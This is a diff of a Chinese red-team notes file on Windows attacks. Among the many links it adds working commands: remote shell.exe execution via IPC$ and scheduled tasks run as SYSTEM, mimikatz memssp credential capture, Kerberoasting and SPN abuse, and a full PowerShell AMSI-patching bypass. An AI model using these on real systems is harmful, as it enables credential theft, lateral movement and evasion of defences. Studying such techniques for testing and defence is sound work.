@@ -1,5 +1,7 @@
 # Windows 安全
 
+> 注 : 笔记中拓扑图 drawio 源文件在其图片目录下
+
 ---
 
 ## 免责声明
@@ -24,19 +26,19 @@
 
 * **[认证](#认证)**
     * [本地](#本地)
-        * [mimikatz](#mimikatz)
+        * [lsass dump](#lsass-dump)
+        * [SAM & LSA Secrets](#sam--lsa-secrets)
         * [加密降级攻击](#加密降级攻击)
-        * SAM & LSA Secrets
-        * Bypass LSA Protection
-        * Bypass Credential Guard
+        * [Bypass LSA Protection](#bypass-lsa-protection)
+        * [Bypass Credential Guard](#bypass-credential-guard)
         * [DPAPI](#dpapi)
+        * [NTLM反射](#NTLM反射)
     * [工作组](#工作组)
         * [IPC$](#ipc)
         * [PTH](#pth)
             * [kb2871997](#kb2871997)
-            * PTH with RDP
+            * [PTH with RDP](#pth-with-rdp)
         * [PTK](#ptk)
-        * [NTLM中继](#NTLM中继)
     * [域](#域)
         * [NTDS.DIT](#ntdsdit)
             * [NTDS转储](#ntds转储)
@@ -47,13 +49,28 @@
         * [PTT](#ptt)
             * [Silver_Tickets](#silver_tickets)
             * [Golden_Tickets](#golden_tickets)
-        * [Kerberoast](#kerberoast)
+        * [NTLM中继](#NTLM中继)
+        * [NTLMv1 攻击面](#ntlmv1-攻击面)
         * [Kerberoasting](#kerberoasting)
         * [委派](#委派)
             * [查找域中委派主机或账户](#查找域中委派主机或账户)
+            * [非约束委派 (TrustedForDelegation)](#非约束委派-trustedfordelegation)
+            * [约束委派 (S4U2Proxy) / 协议转换 (S4U2Self/TrustedToAuthForDelegation)](#约束委派-s4u2proxy--协议转换-s4u2selftrustedtoauthfordelegation)
+            * [基于资源的约束委派 (RBCD)](#基于资源的约束委派-rbcd)
+        * [Kerberos Bronze Bit Attack](#kerberos-bronze-bit-attack)
 
 * **[对抗](#对抗)**
     * [AMSI](#amsi)
+    * [ETW](#etw)
+    * [UAC](#uac)
+    * [DLL 劫持](#dll-劫持)
+    * [PatchGuard](#patchguard)
+    * [Hook](#hook)
+    * [D/Invoke](#dinvoke)
+
+* **[BitLocker](#bitlocker)**
+
+* **[Windows Defender](#windows-defender)**
 
 ---
 
@@ -241,10 +258,12 @@ reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" 
 - [渗透技巧——获得 Windows 系统的远程桌面连接历史记录](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/)
 - [关于 windows 的 RDP 连接记录](http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/)
 - [How to Clear RDP Connections History in Windows](http://woshub.com/how-to-clear-rdp-connections-history/#h2_3)
+- [RDP 登录日志取证与清除](https://paper.seebug.org/1043/)
 
 **相关工具**
 - [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History) - 使用 powershell 列出已登录用户或所有用户的 RDP 连接历史记录
 - [Heart-Sky/ListRDPConnections](https://github.com/Heart-Sky/ListRDPConnections) - C# 读取本机对外 RDP 连接记录和其他主机对该主机的连接记录
+- [Adminisme/SharpRDPLog](https://github.com/Adminisme/SharpRDPLog) - Windows rdp相关的登录记录导出工具，可用于后渗透中Windows服务器的信息收集阶段。输出内容包括：本地rdp端口、mstsc缓存、cmdkey缓存、登录成功、失败日志事件。
 
 **登录成功的日志**
 - 事件ID 4624
@@ -378,6 +397,9 @@ gpupdate /force                                             //更新组策略
 **ProcDump**
 - [ProcDump](../../安全工具/mimikatz.md#procdump)
 
+**SharpDump**
+- [SharpDump](../../安全工具/mimikatz.md#sharpdump)
+
 **ComSvcs.dll**
 - [ComSvcs.dll](../../安全工具/mimikatz.md#comsvcsdll)
 
@@ -387,8 +409,14 @@ gpupdate /force                                             //更新组策略
 **windbg 中载入 mimilib 模块**
 - [windbg 中载入 mimilib 模块](../../安全工具/mimikatz.md#windbg-中载入-mimilib-模块)
 
+**LsassSilentProcessExit**
+- [LsassSilentProcessExit](../../安全工具/mimikatz.md#lsasssilentprocessexit)
+
 **LSASS Shtinkering**
 - [LSASS Shtinkering](../../安全工具/mimikatz.md#lsass-shtinkering)
+
+**HandleKatz**
+- [HandleKatz](../../安全工具/mimikatz.md#handlekatz)
 
 ---
 
@@ -455,11 +483,15 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 
 `NetNTLM Downgrade Attacks`
 
+**描述**
+
+NetNTLM Downgrade Attacks, 通过 SSPI 调⽤ NTLM 身份验证，通过协商使⽤预定义 challenge 降级为 NetNTLMv1，获取到 NetNTLMv1 hash。⽽ NetNTLMv1 hash 可以短时间内使⽤彩虹表去破解。这种情况可以在不接触 LSASS 的情况下检索 NTLM 哈希。可以说比运行 Mimikatz 更隐秘，因为不需要向受保护的进程注入代码或从受保护的进程中转储内存。由于 NetNTLMv1 响应是通过在本地与 NTLMSSP 进行交互而引发的，因此不会生成网络流量，并且所选择的挑战也不容易看到。没有成功的 NTLM 身份验证事件记录在日志中。
+
 **相关文章**
 - [Post Exploitation Using NetNTLM Downgrade Attacks](https://www.optiv.com/explore-optiv-insights/blog/post-exploitation-using-netntlm-downgrade-attacks)
 
 **相关工具**
-- [eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue) - NetNTLM Downgrade Attacks, 通过 SSPI 调⽤ NTLM 身份验证，通过协商使⽤预定义 challenge 降级为 NetNTLMv1，获取到 NetNTLMv1 hash。⽽ NetNTLMv1 hash 可以短时间内使⽤彩虹表去破解。这种情况可以在不接触 LSASS 的情况下检索 NTLM 哈希。可以说比运行 Mimikatz 更隐秘，因为不需要向受保护的进程注入代码或从受保护的进程中转储内存。由于 NetNTLMv1 响应是通过在本地与 NTLMSSP 进行交互而引发的，因此不会生成网络流量，并且所选择的挑战也不容易看到。没有成功的 NTLM 身份验证事件记录在日志中。
+- [eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)
     ```
     InternalMonologue -Downgrade False -Restore False -Impersonate True -Verbose False -Challenge 1122334455667788
     ```
@@ -487,12 +519,19 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 
 #### Bypass Credential Guard
 
-1. 从磁盘上的 SAM 读取凭据
-2. SSP 是参与用户身份验证的 Microsoft 软件包，如在用户登录时被调用，并接收该用户的凭据。在系统启动时 SSP 会被加载到进程 lsass.exe 中。,Mimikatz 可通过内存安装自定义的 ssp，修改 lsass 进程的内存，实现从 lsass 进程中提取凭据，mimikatz 执行 misc::memssp 后，如果再输入了新的凭据 (如用户锁屏后重新登录)，将会在 c:\windows\system32 下生成文件 mimilsa.log，其中保存有用户明文密码。
-    ```
-    privilege::debug
-    misc::memssp
-    ```
+**描述**
+
+SSP 是参与用户身份验证的 Microsoft 软件包，如在用户登录时被调用，并接收该用户的凭据。在系统启动时 SSP 会被加载到进程 lsass.exe 中。
+
+Mimikatz 可通过内存安装自定义的 ssp，修改 lsass 进程的内存，实现从 lsass 进程中提取凭据，mimikatz 执行 misc::memssp 后，如果再输入了新的凭据 (如用户锁屏后重新登录)，将会在 c:\windows\system32 下生成文件 mimilsa.log，其中保存有用户明文密码。
+```
+privilege::debug
+misc::memssp
+```
+
+**相关文章**
+- [Revisiting a Credential Guard Bypass](https://itm4n.github.io/credential-guard-bypass/)
+    - https://github.com/itm4n/Pentest-Windows/tree/main/CredGuardBypassOffsets
 
 ---
 
@@ -541,6 +580,12 @@ int main(void)
 
 ---
 
+#### NTLM反射
+
+- [NTLM反射](./实验/NTLM中继.md#ntlm-反射)
+
+---
+
 ### 工作组
 
 #### IPC$
@@ -551,6 +596,7 @@ int main(void)
 - [IPC$入侵大全](https://www.cnblogs.com/backlion/p/7401609.html)
 - [内网渗透 | 基于IPC的横向移动](https://sec.thief.one/article_content?a_id=033847e03bd6e49dbc730c7315d5b4d6)
 - [关于IPC和PTH用户权限问题](https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/)
+- [Windows的IPC$共享学习](https://mp.weixin.qq.com/s/QEAgpvit3n7MMhRWosArMA)
 
 **IPC$ 的利用条件**
 
@@ -558,17 +604,46 @@ int main(void)
 - 管理员开启了默认共享
 
 **攻击方式**
+
+空连接 (权限低)
 ```bash
-net use \\192.168.1.1\c$ “12345@12345qw” /user:ffffffff0x\administrator
-net use \\192.168.1.1\c$ "123456" /user:administrator         # 建立的非空连接
+net use \\192.168.1.1\ipc$ /u:"" ""
 net use \\192.168.1.1\c$  "" /user:administrator              # 空连接，无密码
+```
+
+非空连接
+```bash
+# 普通用户权限建立时,仅能查看时间
+net time \\192.168.1.1
+
+# 管理员权限
+net use \\192.168.1.1\c$ “12345@12345qw” /user:ffffffff0x\administrator
 net use \\192.168.1.1\c$ /del   # 删除建立的 IPC 连接
 net use                         # 查看本机连接共享情况
+dir \\192.168.1.1\c$\Users      # 查看远程文件
+net use k: \\192.168.1.1\c$ /u:"administrator" "Admin@admin"    # 远程盘映射到本地
+tasklist /S 192.168.1.1 /U administrator -P Admin@admin         # 查看进程
+copy test.txt \\192.168.1.1\c$                               # 将指定文件拷贝到目标系统中
 
-psexec.exe \\192.168.1.1 cmd    # 通过 psexec 工具进行会话连接执行
-psexec.exe \\192.168.1.1 cmd -u administrator -p 123456
+# 执行定时任务
+# at命令：只适用于win xp、2003等低版本：at 命令是Windows自带的用于创建计划任务的命令，但是 at 命令只在2003及以下的版本使用
+net use  \\192.168.1.1  /u:"administrator"  "Admin@admin"
+copy shell.exe \\192.168.1.1\c$ # 拷贝shell
+net time \\192.168.1.1          # 查看目标时间
+at \\192.168.1.1  11:11:00 cmd.exe /c "c:\shell.exe"
 
-csript.exe wmiexec.vbs /shell 192.168.1.1 administrator 123456
+# schtasks 命令：Windows Vista、Windows Server 2008及之后版本
+net use  \\192.168.1.1  /u:"administrator"  "Admin@admin"
+copy shell.exe \\192.168.1.1\c$ # 拷贝shell
+net time \\192.168.1.1          # 查看目标时间
+schtasks /create /s 192.168.1.1 /u administrator /p Admin@admin /tn test_sch /tr c:/shell.exe  /sc once /st 11:11
+# /s 目标 /u 用户名 /p 密码  /tn 计划任务名  /tr 指定文件路径   /sc 执行次数 或频率   /st 开始时间
+schtasks /query  /s 192.168.1.1 /u administrator /p Admin@admin  /tn test_sch   # 查看任务计划
+schtasks /delete /s 192.168.1.1 /u administrator /p Admin@admin /tn test_sch    # 删除任务计划
+
+# 在目标主机上创建一个名为 test_sch 的计划任务，启动程序为c:/shell.exe ，启动权限为system，启动时间为每隔一小时启动一次
+schtasks /create /s 192.168.1.1 /u administrator /p Admin@admin /tn test_sch /sc HOURLY /mo 1 /tr c:/shell.exe /ru system /f
+schtasks /run /s 192.168.1.1 /u administrator /p Admin@admin /i /tn test_sch    # 启动该计划任务
 ```
 
 ---
@@ -601,6 +676,7 @@ path-the-hash,中文直译过来就是 hash 传递，在域中是一种比较常
 - [KB22871997是否真的能防御PTH攻击？](https://www.anquanke.com/post/id/193150)
 - [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
 - [【技术分享】从hash传递攻击谈相关Windows安全机制](https://www.anquanke.com/post/id/85995)
+- [内网各端口hash传递技巧](https://mp.weixin.qq.com/s/IHnbeGoaSwHfWwomHZHcdQ)
 
 **攻击适用情况**
 - 在工作组环境中：
@@ -677,7 +753,7 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
 
     - Wmiexec.py
 
-        它会生成一个使用 Windows Management Instrumentation 的半交互式 shell，并以管理员身份运行。你不需要在目标服务器
+        生成一个使用 Windows Management Instrumentation 的半交互式 shell，并以管理员身份运行。
         ```
         ./wmiexec.py test/Administrator:Abcd1234@192.168.1.100
         ```
@@ -780,10 +856,6 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
 - **mimikatz**
 
     mimikatz 的 PTK 相关操作见 [mimikatz 笔记](../../安全工具/mimikatz.md#ptk)
-
-#### NTLM中继
-
-- [NTLM中继](./实验/NTLM中继.md)
 
 ---
 
@@ -1299,11 +1371,32 @@ mimikatz 的 Golden_Tickets 相关操作见 [mimikatz 笔记](../../安全工具
 
 ---
 
-#### Kerberoast
+#### NTLM中继
+
+- [NTLM中继](./实验/NTLM中继.md)
+
+---
+
+#### NTLMv1 攻击面
+
+**相关文章**
+- [NTLMv1 vs NTLMv2: Digging into an NTLM Downgrade Attack](https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/)
+- [Elevating with NTLMv1 and the Printer Bug](https://www.fortalicesolutions.com/posts/elevating-with-ntlmv1-and-the-printer-bug)
+- [PRACTICAL ATTACKS AGAINST NTLMV1](https://www.trustedsec.com/blog/practical-attacks-against-ntlmv1/)
+
+---
+
+#### Kerberoasting
 
 `Kerberos TGS 票据离线破解`
 
-> 以下内容来自文章 <sup>[[浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/#kerberoast)]</sup>
+**相关文章**
+- [Kerberoasting Attacks and Detections](https://medium.com/@bubba7988/kerberoasting-attacks-and-detections-28c81ef98503)
+- https://b404.xyz/2019/07/23/Study-Windows-Authentication/#kerberoasting
+- [域渗透——Kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting)
+- [Kerberos协议之Kerberoasting和SPN](https://y4er.com/posts/kerberos-kerberoasting-spn/)
+
+**描述**
 
 服务票据使用服务账户的 NTLM Hash 加密，不用获取运行该服务系统的 shell，任何域用户就可以转储 Hash
 
@@ -1329,7 +1422,21 @@ Kerberoast 攻击涉及五个步骤：
     net user administrator /domain  可查看
     ```
 
+**spn 介绍**
+- [spn](../../../Integrated/Windows/笔记/认证.md#spn)
+
+**spn 扫描**
+- [spn 扫描](../信息收集/信息收集.md#spn扫描)
+
+##### 获得高价值的SPN
+
 攻击者最感兴趣的是具有高权限用户组的服务帐户如域管理员组的成员。要快速列出高权限用户组的服务帐户的方法是枚举“AdminCount” 属性等于“1”的所有帐户。攻击者只需要向 AD 请求具有 SPN 且 AdminCount = 1 的所有用户帐户。
+
+需要满足以下条件：
+- 该SPN注册在域用户帐户(Users)下
+- 域用户账户的权限很高
+
+**使用powershell模块Active Directory**
 
 使用 Active Directory powershell 模块（域控制器一般会安装）中的 Get-ADUser cmdlet：
 ```powershell
@@ -1342,35 +1449,55 @@ get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * 
 import-module .\Microsoft.ActiveDirectory.Management.dll
 ```
 
-Microsoft.ActiveDirectory.Management.dll 在安装 powershell 模块 Active Directory 后会生成，直接在域控上环境就能扣出来
+Microsoft.ActiveDirectory.Management.dll 在安装 powershell 模块 Active Directory 后会生成，直接在域控上环境就能复制一个出来
 
-使用 gpedit.msc 将域控上的组策略管理编辑器打开,`计算机配置-->Windows设置-->安全设置-->安全选项-->"网络安全: 配置 Kerberos 允许的加密类型"`，配置 Kerberos 的加密类型为 RC4，并运行 gpupdate 更新策略
+也可以用github上现成的
+- https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll
 
-**导出**
+**使用PowerView**
 
-- https://github.com/nidem/kerberoast
+- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+    ```
+    Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon
+    ```
 
-使用 Kerberoast 中的 GeUserSPNs 进行扫描：
-```bash
-setspn.exe -q */*
+**使用kerberoast**
 
-# 或
-.\GetUserSPNs.vbs
+powershell:
+- https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
+
+vbs:
+- https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs
+
+参数如下：
+```
+cscript GetUserSPNs.vbs
 ```
 
-根据微软提供的类 KerberosRequeststorSecurityToken 发起 Kerberos 请求申请票据, 请求指定的 ST 票据:
+##### 请求/导出TGS
+
+**请求指定的 TGS**
+
+根据微软提供的类 KerberosRequeststorSecurityToken 发起 Kerberos 请求申请票据,:
+```bash
+$SPNName = 'MSSQLSvc/DC1.test.com'
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
+```
+
+**请求所有 TGS**
+
 ```bash
 Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/Srv-DB-ffffffff0x.ffffffff0x.com:1433"
-
-# 或请求全部票据
-setspn.exe -T ffffffff0x.com -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.Post Context[0].Trim() }
+setspn.exe -q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
 
 使用 klist 命令查看当前会话存储的 Kerberos 票据：
 ```bash
 klist
 ```
+
+**导出**
 
 使用 mimikatz 导出内存中的票据(mimikatz 无需提权)：
 ```bash
@@ -1395,27 +1522,25 @@ kerberos::ptt test.kirbi
 ```
 攻击者知道一台服务器(或多台服务器)的服务账户和密码，就可以通过此方法将其域用户权限提升到域管。
 
----
+##### Without Mimikatz
 
-#### Kerberoasting
+**相关文章**
+- [Kerberoasting Without Mimikatz](https://web.archive.org/web/20220212163642/https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
 
-> 以下内容来自文章 <sup>[[浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/#kerberoasting)]</sup>
-
-kerberoast 攻击，利用 mimikatz 从内存中导出票据破解。而 Kerberoasting 攻击可以不使用 mimikatz，且普通用户权限就可以实现。
+Empire 实现的 Invoke-Kerberoast 攻击可以不使用 mimikatz，且普通用户权限就可以实现。
 
 **导出**
-- **Rubeus**
-    - https://github.com/GhostPack/Rubeus
-        ```
-        Rubeus.exe kerberoast
-        ```
-
 - **Invoke-Kerberoast**
 
-    也可以在域内一台主机上导入 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 ，以普通用户权限执行：
+    可以在域内一台主机上导入 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 ，以普通用户权限执行：
     ```powershell
     Import-Module .\Invoke-Kerberoast.ps1
     Invoke-Kerberoast -Outputformat Hashcat | fl > test1.txt
+    ```
+
+    导出高权限的用户
+    ```powershell
+    Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
     ```
 
     只提取出 hash 的命令：
@@ -1423,10 +1548,19 @@ kerberoast 攻击，利用 mimikatz 从内存中导出票据破解。而 Kerbero
     Invoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
     ```
 
+- **Rubeus**
+    - https://github.com/GhostPack/Rubeus
+        ```
+        Rubeus.exe kerberoast
+        ```
+
 - **GetUserSPN**
-    使用 impacket 中的 GetUserSPN.py 也可以获取，不过需要域用户名和密码：
+    - https://github.com/maaaaz/impacket-examples-windows/
+    - https://github.com/SecureAuthCorp/impacket
+
+    使用 impacket 中的 GetUserSPN.py 也可以获取
     ```powershell
-    GetUserSPNs.exe -request -c -ip 192.168.3.142 ffffffff0x.com/sqlsvr
+    python .\GetUserSPNs.py -request -dc-ip 172.16.33.3 -debug test.local/jack
     ```
 
 - 也可以使用 https://github.com/blacklanternsecurity/Convert-Invoke-Kerberoast
@@ -1442,17 +1576,45 @@ hashcat -m 13100 -w 3 -a 3 -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l   # 使用掩�
 ./john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
+##### 后利用
+
+在我们取得了 SPN 的修改权限后，可以为指定的域用户添加一个 SPN，这样可以随时获得该域用户的 TGS，经过破解后获得明文口令
+
+例如为域用户 Administrator 添加 SPNVNC/DC1.test.com，参数如下：
+```
+setspn.exe -U -A VNC/DC1.test.com Administrator
+```
+
+这样在域内任意一台主机都能获得该 SPN，并且能够使用 Kerberoast 获得 TGS
+```
+Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
+```
+再使用 hashcat 破解即可
+
+当需要删除 SPN 的时候，使用如下命令：
+```
+setspn.exe -D VNC/DC1.test.com Administrator
+```
+
+##### 缓解措施
+
+- [kerberoast 缓解措施](../../../Integrated/Windows/Secure-Win.md#kerberoast-缓解措施)
+
 ---
 
 #### 委派
+
+关于委派的基本知识点可见笔记 [认证](../../../Integrated/Windows/笔记/认证.md#委派)
 
 ##### 查找域中委派主机或账户
 
 > 以下内容来自文章 <sup>[[浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/#%E6%9F%A5%E6%89%BE%E5%9F%9F%E4%B8%AD%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA%E6%88%96%E8%B4%A6%E6%88%B7)]</sup>
 
-当服务账号被设置为非约束性委派时，其 `userAccountControl` 属性会包含为 TRUSTED_FOR_DELEGATION;当被设置为约束性委派时，其 userAccountControl 属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION（T2A4D），且 msDS-AllowedToDelegateTo 属性会被设置为哪些协议:
+当服务账号被设置为非约束性委派时，其 `userAccountControl` 属性会包含为 TRUSTED_FOR_DELEGATION.
 
-加载 powerview，查询无约束委派账户：
+当被设置为约束性委派时，其 `userAccountControl` 属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION（T2A4D），且 `msDS-AllowedToDelegateTo` 属性会包含被约束的服务.
+
+加载 powerview，查询非约束性委派账户：
 ```powershell
 Get-NetUser -Unconstrained -Domain ffffffff0x.com
 
@@ -1460,7 +1622,7 @@ Get-NetUser -Unconstrained -Domain ffffffff0x.com
 Get-DomainUser -Properties useraccountcontrol,msds-allowedtodelegateto| fl
 ```
 
-加载 powerview，查询无约束委派机器：
+加载 powerview，查询非约束性委派机器：
 ```powershell
 Get-NetComputer -Unconstrained -Domain ffffffff0x.com
 
@@ -1478,19 +1640,58 @@ Get-DomainComputer -TrustedToAuth -Domain ffffffff0x.com
 ```
 当一个用户具备对某个服务账号的 SeEnableDelegationPrivilege 权限时，表示可以更改服务账号的委派设置，一般情况下只有域管理员才具备这个权限。因此也可以利用 SeEnableDelegationPrivilege 属性，制作极其隐蔽的后门。
 
-**案例**
+##### 非约束委派 (TrustedForDelegation)
 
-非约束委派攻击：当域控管理员访问 A 服务时，A 服务就会将访问者的 TGT 保存在内存中（此时攻击者无法访问域控），但是攻击者通过 mimikatz 的 sekurlsa::tickets /export 命令导出内存中域控管理员访问 A 服务的票据，将其注入到内存，这时候就可以访问域控。
+**描述**
 
-![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/1.png)
+委派就是将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。将我的权限给服务账户。
 
+需要注意的一点是接受委派的用户只能是服务账户或者计算机用户
+
+**相关文章**
+- [Kerberos协议之非约束委派](https://y4er.com/posts/kerberos-unconstrained-delegation/)
+- [Exploiting Unconstrained Delegation](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976)
+
+**配合 MS-RPRN abuse**
+- [MS-RPRN abuse](./实验/NTLM中继.md#ms-rprn-abuse)
+
+##### 约束委派 (S4U2Proxy) / 协议转换 (S4U2Self/TrustedToAuthForDelegation)
+
+**描述**
+
+因为非约束委派的不安全性，约束委派应运而生。在 2003 之后微软引入了非约束委派，对 Kerberos 引入 S4U，包含了两个子协议 S4U2self、S4U2proxy。S4U2self 可以代表自身请求针对其自身的 Kerberos 服务票据 (ST)，S4U2proxy 可以以用户的名义请求其它服务的 ST，约束委派就是限制了 S4U2proxy 扩展的范围。
+
+![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/13.png)
+
+具体过程是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的 kerberos 服务票据 (S4U2SELF)，拿着这个票据向 KDC 请求访问特定服务的可转发的 TGS(S4U2PROXY)，并且代表用户访问特定服务，而且只能访问该特定服务。
+
+**相关文章**
+- [Kerberos协议之约束委派](https://y4er.com/posts/kerberos-constrained-delegation/)
+
+**查找约束委派的用户**
 ```
-kekeo.exe "tgt::ask /user:sqlsvr /domain:ffffffff0x.com /password:Admin12345" exit
-
-kekeo.exe "tgs::s4u /tgt:TGT_sqlsvr@ffffffff0x.com_krbtgt~ffffffff0x.com@ffffffff0x.com.kirbi /user:administrator@ffffffff0x.com /service:/service:service_to_access" exit
-
-Tgs::s4u /tgt:service_account_tgt_file /user:administrator@ffffffff0x.com /service:service_to_access
+AdFind.exe -b dc=test,dc=local -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" -dn
 ```
+
+查找约束委派的主机
+```
+(&(samAccountType=805306369)(msds-allowedtodelegateto=*))
+```
+
+##### 基于资源的约束委派 (RBCD)
+
+**描述**
+
+Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。
+
+**相关文章**
+- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+- [Kerberos协议之基于资源的约束委派](https://y4er.com/posts/kerberos-resource-based-constrained-delegation/)
+
+#### Kerberos Bronze Bit Attack
+
+**相关文章**
+- [Kerberos Bronze Bit Attack 绕过约束委派限制](https://y4er.com/posts/kerberos-bronze-bit-attack/)
 
 ---
 
@@ -1498,19 +1699,110 @@ Tgs::s4u /tgt:service_account_tgt_file /user:administrator@ffffffff0x.com /servi
 
 ### AMSI
 
+**什么是 AMSI**
+
+AMSI(Antimalware Scan Interface) ，在内存中扫描恶意代码并且可以转发至 av 用于检测恶意程序执行，具体 API 落于 amsi.dll。
+
+AMSI 内置于 Powershell 中，所以会经常见到很多 Powershell 恶意利用都需要先去 bypass AMSI
+
 **相关文章**
 - [初探Powershell与AMSI检测对抗技术](https://www.anquanke.com/post/id/168210)
 - [How to bypass Defender in a few easy steps](https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/)
+- [文本类型的免杀](https://mp.weixin.qq.com/s/xwjjP5OrrxCfazBf6i_J1g)
 
 **相关工具**
 - [Flangvik/NetLoader](https://github.com/Flangvik/NetLoader) - Loads any C# binary in mem, patching AMSI + ETW.
 - [mdsecactivebreach/SharpPack](https://github.com/mdsecactivebreach/SharpPack) - SharpPack is a toolkit for insider threat assessments that lets you defeat application whitelisting to execute arbitrary DotNet and PowerShell tools.
 
-### Bypass UAC
+**改变调查结果**
+
+```powershell
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $Win32
+$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
+$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
+$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
+$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
+#0:  31 c0                   xor    eax,eax
+#2:  05 78 01 19 7f          add    eax,0x7f190178
+#7:  05 df fe ed 00          add    eax,0xedfedf
+#c:  c3                      ret
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
+```
+
+---
+
+### ETW
+
+**什么是 ETW**
+
+ETW(Event Trace for Windows) 是一个高效的内核级别的事件追踪机制，它可以记录系统内核或是应用程序的事件 (进程、文件、网络、注册表等行为) 到 Windows 日志文件， Process Monitor 工具以及大名鼎鼎的 Sysmon 也是基于 ETW 进行事件跟踪，有很多的 EDR 都是基于该数据源进行检测。
+
+**相关文章**
+- [Design Issues Of Modern EDRs: Bypassing ETW-Based Solutions](https://www.binarly.io/posts/Design_issues_of_modern_EDRs_bypassing_ETW-based_solutions/index.html)
+- [两种最新Bypass ETW的方法](https://www.anquanke.com/post/id/202797)
+- [基于内存补丁ETW的绕过](https://idiotc4t.com/defense-evasion/memory-pacth-bypass-etw)
+- [Hiding your .NET - ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
+
+### UAC
 
 **相关文章**
 - [Advanced Windows Task Scheduler Playbook - Part.2 UAC](https://mp.weixin.qq.com/s/3H6krW59Sci5SsA_5fyOzw)
     - https://github.com/zcgonvh/TaskSchedulerMisc
+
+**相关项目**
+- [zha0gongz1/iscsicpl_bypassUAC](https://github.com/zha0gongz1/iscsicpl_bypassUAC) - UAC bypass for x64 Windows 7 - 11（无弹窗版）
+
+### DLL 劫持
+
+**相关文章**
